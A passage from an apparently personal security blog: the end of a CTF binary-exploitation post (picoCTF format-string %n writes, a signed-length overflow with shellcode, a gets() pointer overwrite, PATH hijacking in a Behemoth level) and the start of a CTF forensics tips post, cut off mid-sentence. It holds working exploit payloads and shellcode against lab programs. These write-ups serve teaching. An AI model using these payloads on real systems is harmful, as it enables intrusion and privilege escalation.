</span><span class='line'>ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000</span></code></pre></td></tr></table></div></figure>
We see that the address is present on the stack at the seventh position.

Otherwise, we can put it on the stack by
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141</span></code></pre></td></tr></table></div></figure>
What this is doing is &#8220;Extracting particular stack content by &#8220;%$i\$x&#8221;. As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>or i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
</span><span class='line'>Offset: 103:AAAA41410074
</span><span class='line'>Offset: 104:AAAA31254141</span></code></pre></td></tr></table></div></figure>
So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
</span><span class='line'>Offset: 103:AAAA41414141</span></code></pre></td></tr></table></div></figure>
It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
</span><span class='line'>$ id
</span><span class='line'>uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
</span><span class='line'>$ ls
</span><span class='line'>Makefile  flag.txt  format  format.c
</span><span class='line'>$ cat flag.txt
</span><span class='line'>who_thought_%n_was_a_good_idea?</span></code></pre></td></tr></table></div></figure>
Otherwise as the address at the seventh is already present on stack we can also do
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format "%1337u%7\$n"</span></code></pre></td></tr></table></div></figure>
We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./format %08x.%08x.%08x.%08x.%08x.%1292u%n</span></code></pre></td></tr></table></div></figure>
If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see &#8220;%08x.&#8221; is of eight characters + 1 of &#8220;.&#8221; or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.

</li>

<li>
In another example below,
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define BUFSIZE 256</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">greet</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What is your name?&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">!&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;How long is your name?&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">BUFSIZE</span><span class="p">)</span> <span class="c1">//don&#39;t allow buffer overflow</span>
</span><span class='line'>        <span class="n">greet</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Length was too long!&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there&#8217;s any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">no_overflow</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">268</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\xd0\xd6\xff\xff</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">200</span><span class="o">+</span><span class="s">&quot; &quot;</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc9</span><span class="err">\</span><span class="n">xf7</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">x51</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span><span class="s">&quot;&#39;; cat) | ./no_overflow</span>
</span><span class='line'><span class="n">How</span> <span class="kt">long</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
</span><span class='line'><span class="n">What</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
</span><span class='line'><span class="n">Hello</span><span class="p">,</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAA</span><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">no_overflow</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">what_is_your_sign</span>
</span></code></pre></td></tr></table></div></figure>
</li>

<li>
In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string &#8220;not_the_flag.txt&#8221; as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) br *puts
</span><span class='line'>Breakpoint 1 at 0x8048460
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /home/what_the_flag/what_the_flag 
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0xf7e81ee0 in puts () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) x/s 0x08048777
</span><span class='line'>0x8048777:    "not_the_flag.txt"
</span><span class='line'>(gdb) x/s 0x08048778
</span><span class='line'>0x8048778:    "ot_the_flag.txt"
</span><span class='line'>(gdb) x/s 0x08048770
</span><span class='line'>0x8048770:    "le: %s"
</span><span class='line'>(gdb) x/s 0x0804877C
</span><span class='line'>0x804877c:    "he_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877D
</span><span class='line'>0x804877d:    "e_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877E
</span><span class='line'>0x804877e:    "_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877F
</span><span class='line'>0x804877f:    "flag.txt"
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">message_data</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">message</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">file_name</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">read_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">file</span><span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;Cannot read file: %s&quot;</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">message_data</span> <span class="n">data</span><span class="p">;</span>
</span><span class='line'>    <span class="n">data</span><span class="p">.</span><span class="n">file_name</span> <span class="o">=</span> <span class="s">&quot;not_the_flag.txt&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter your password too see the message:&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">gets</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;1337_P455W0RD&quot;</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">read_file</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">file_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">));</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Incorrect password!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual:

gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below).

So by using the following input, we can overwrite the file pointer and still provide the correct password:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1337_P455W0RD
</span><span class='line'>1337_P455W0RD\0aa\x7f\x87\x04\x08
</span><span class='line'>aa\x7f\x87\x04\x08</span></code></pre></td></tr></table></div></figure>
We use this in the command line to get the flag
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/what_the_flag$ printf "1337_P455W0RD\0bb\x7f\x87\x04\x08" | ./what_the_flag
</span><span class='line'>Enter your password too see the message:
</span><span class='line'>Congratulations! Here is the flag: who_needs_%eip
</span><span class='line'>
</span><span class='line'>pico83515@shell:/home/what_the_flag$</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>Miscellanous Examples:</h3>

<p>Let&rsquo;s see some miscellanous examples away from Buffer/Format Vulnerabilities.</p>

<ol>
<li>So, we have a binary which when executed gives
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/behemoth$ ./behemoth2 
</span><span class='line'>touch: cannot touch '13373': Permission denied</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see what ltrace provides us
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/behemoth$ ltrace ./behemoth2 
</span><span class='line'>__libc_start_main(0x804856d, 1, 0xffffd794, 0x8048640 &lt;unfinished ...&gt;
</span><span class='line'>getpid()                                                                                                               = 14118
</span><span class='line'>sprintf("touch 14118", "touch %d", 14118)                                                                              = 11
</span><span class='line'>__lxstat(3, "14118", 0xffffd688)                                                                                       = -1
</span><span class='line'>unlink("14118")                                                                                                        = -1
</span><span class='line'>system("touch 14118"touch: cannot touch '14118': Permission denied
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 256
</span><span class='line'>sleep(2000</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides the file status, unlink -call the unlink function to remove the specified file. 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048588 &lt;+27&gt;:    call   0x8048410 &lt;getpid@plt&gt;
</span><span class='line'>   0x080485b3 &lt;+70&gt;:    call   0x8048450 &lt;sprintf@plt&gt;
</span><span class='line'>   0x080485c7 &lt;+90&gt;:    call   0x80486c0 &lt;lstat&gt;
</span><span class='line'>   0x080485df &lt;+114&gt;:   call   0x8048400 &lt;unlink@plt&gt;
</span><span class='line'>   0x080485eb &lt;+126&gt;:   call   0x8048420 &lt;system@plt&gt;
</span><span class='line'>   0x080485f7 &lt;+138&gt;:   call   0x80483e0 &lt;sleep@plt&gt;
</span><span class='line'>   0x08048616 &lt;+169&gt;:   call   0x8048420 &lt;system@plt&gt;
</span><span class='line'>   0x08048635 &lt;+200&gt;:   leave  
</span><span class='line'>   0x08048636 &lt;+201&gt;:   ret </span></code></pre></td></tr></table></div></figure>
If you check the ltrace output
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>system("touch 14118"touch: cannot touch '14118': Permission denied</span></code></pre></td></tr></table></div></figure>
touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like&#8230; so if you create a file in /tmp/ called touch, it&#8217;ll actually execute that instead of /usr/bin/touch
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/tmp/rahul2$ cat touch 
</span><span class='line'>cat /etc/behemoth_pass/behemoth3
</span><span class='line'>behemoth2@melinda:/tmp/rahul2$ history | grep PATH
</span><span class='line'>   19  history | grep PATH
</span><span class='line'>behemoth2@melinda:/tmp/rahul2$ PATH=/tmp/rahul2:$PATH /behemoth/behemoth2 
</span><span class='line'>**********</span></code></pre></td></tr></table></div></figure>


</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Forensics]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics/"/>
    <updated>2014-11-07T22:07:09+00:00</updated>
    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Forensics challenges during various CTF&rsquo;s.</p>

<!-- more -->


<ol>
<li>If you are provided a <strong>jar</strong> file in the challenge, JAR (Java ARchive) is a package file format typically used to aggregate many Java class files and associated metadata and resources (text, images, etc.) into one file to distribute application software or libraries on the Java platform. It can be extracted using 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jar xf jar-file
</span><span class='line'>
</span><span class='line'>x : extract files from the JAR archive.
</span><span class='line'>f : JAR file from which files are to be extracted is specified on the command line, rather than through stdin.
</span><span class='line'>The jar-file argument is the filename (or path and filename) of the JAR file from which to extract files.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Wireshark - Searching for answers in pcap file? 
<ul>
<li>Searching passwords in HTTP Web traffic in wireshark? http.request.method == &#8220;POST&#8221; filter might help, based on concept that server is asking for LOGIN prompt and user is POSTing his password in cleartext.</li>
<li>If the challenge says IP address has been spoofed, then you should look for MAC address as it wouldn&#8217;t have changed. You would find packets with two different IP address having same MAC address. In another scenario, if the MAC address has been spoofed, IP address might be the same. In both cases display filter &#8220;arp&#8221; (to only show arp requests) and &#8220;ip.addr==<IP address>&#8221; (to show only packets with either source or destination being the IP address). might be helpful.</li>
<li>Sometimes, it is better to check which objects we are able to export, (File &#8211;> Export Objects &#8211;> HTTP/DICOM/SMB/SMB2) export the http/DICOM/SMB/SMB2 object </li>
<li>Sometimes, you need to find all the unique ip address in the network capture, for that you can use 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tshark -T fields -e ip.src -r &lt; pcap file&gt; | sort | uniq
</span><span class='line'>
</span><span class='line'>-T             : Set the format of the output when viewing decoded packet data.
</span><span class='line'>-e &lt;field&gt;     : Add a field to the list of fields to display if -T fields is selected.
</span><span class='line'>-r &lt;pcap file&gt; : Read packet data from infile, can be any supported capture file format (including gzipped files). </span></code></pre></td></tr></table></div></figure></li>
</ul>
</li>
<br>
<li>If in a challenge, you are provided a setgid program which is able to read a certain extension files and flag is present in some other extension, create a symbolic link to the flag with the extension which can be read by the program. For example: In picoCTF 2014 Supercow challenge, a program named supercow was able to read files with .cow extension only and flag was present with flag.txt. So we created a symbolic link like ln -s flag.txt flag.cow</li>
<br>
<li>If in a challenge, you are provided with a <b>APK</b> file. There are three ways to decompile it as described below:
<ul>
<li>Apktool:
It is used to decode resources to nearly original form (including resources.arsc, XMLs and 9.png files) and rebuilding them. Also, used for smali debugging.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apktool d file.apk output-dir
</span><span class='line'>d : decode to output-dir</span></code></pre></td></tr></table></div></figure>
apktool converts the apk file in to smali format. smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android&#8217;s Java VM implementation.
</li>
<li>Dex2jar: To see the java code (approx)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1. Change the extension of file.apk from .apk to .zip
</span><span class='line'>2. Unzip the file.zip 
</span><span class='line'>3. After unzip, you would get classes.dex file.
</span><span class='line'>4. Use dex2jar classes.dex (It would create classes_dex2jar.jar file)
</span><span class='line'>5. Extract jar file by jar xf classes_dex2jar.jar
</span><span class='line'>6. This would provide you with .class files which could be open by jd-gui (Java Decompiler) tool. </span></code></pre></td></tr></table></div></figure>
</li>

<li>Use online services such as [http://www.decompileandroid.com/](http://www.decompileandroid.com). Once it&#8217;s decompiled, we can download the decompiled files and unpack them. </li>

</ul>
</li>
<br>
<li>If you are provided a <b>disk.img</b> file, from which files have to recovered, you could use foremost tool used to recover files using their headers, footers, and data structures.</li>
<br>
<li>If you are having a source code of evil program, check the source code of the real program, do a comparision and find the added evil code.</li>
<br>
<li>If you are looking for <b>hidden flag in an image</b> first check with file, exiftool command, and make sure the extension is correctly displayed. After that check the image file with hexdump -C and look for interesting pattern may be? If you get 7z or PK they represent Zipped files. If so, you can extract those file with 7z x <image_file>. If somehow, you get a passphrase for the image, then you might have to use steghide tool as it allows to hide data with a passphrase.</li>
<br>
<li>Sometimes, if you extract some files, if you wuld see a blank name, you know there is some file but can&#8217;t see a name, like file name could be spaces?, then 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lb might be of help.
</span><span class='line'>-b, --escape :   print C-style escapes for nongraphic characters
</span></code></pre></td></tr></table></div></figure> 

How to open a filename named &#8220;-&#8221;

We can create a file named &#8220;-&#8221; by 
